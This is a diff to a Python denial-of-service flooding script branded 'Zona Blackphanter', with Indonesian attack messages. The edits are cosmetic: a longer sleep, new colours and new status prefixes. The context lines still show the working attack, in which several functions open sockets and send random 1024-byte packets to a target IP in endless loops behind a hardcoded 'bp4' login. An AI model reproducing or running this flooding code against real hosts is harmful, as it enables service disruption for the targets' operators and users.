@@ -30,7 +30,7 @@ class bcolors:
 os.system("clear")
 os.system("https://github.com/Kodekeras24")
 print("\033[37mWelcome to Zona Blackphanter\033[0m")
-time.sleep(2)
+time.sleep(5)
 print("Loading.......")
 
 attemps = 0
@@ -58,7 +58,7 @@ while attemps < 100:
     password = input("\033[31mEnter your password: \033[0m")
 
     if username == 'bp4' and password == 'bp4':
-        print("\033[97m⟩⟩ Hai...! Welcome to zona attack BLACKPHANTER \033[0m")
+        print("\033[32m⟩⟩ Hai...! Welcome to zona attack BLACKPHANTER \033[0m")
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -87,7 +87,7 @@ time.sleep(5),
 
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[+]","[-]"))
+	i = random.choice(("[+]","[*]","[#]","[×]","[-]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -108,7 +108,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[+]  \033[96mPermintaan \033[92mPengiriman \033[34mPesan\033[0m")
+			print("[*]  \033[96mPermintaan \033[92mPengiriman \033[34mPesan\033[0m")
 		except:
 			s.close()
 			print("[-]  \033[31mMay be down\033[0m")
@@ -123,7 +123,7 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[+] \033[32mMemulai \033[95mSerangan \033[0m")
+			print("[#] \033[32mMemulai \033[95mSerangan \033[0m")
 		except:
 			s.close()
 			print("[-]  \033[31mMay be down\033[0m")
@@ -138,7 +138,7 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[+]  \033[32mTarget \033[33mTerpantau \033[32m" +ip+ "\033[0m")
+			print("[×]  \033[32mTarget \033[33mTerpantau \033[32m" +ip+ "\033[0m")
 		except:
 			s.close()
 			print("[-]  \033[31mMay be down\033[0m")
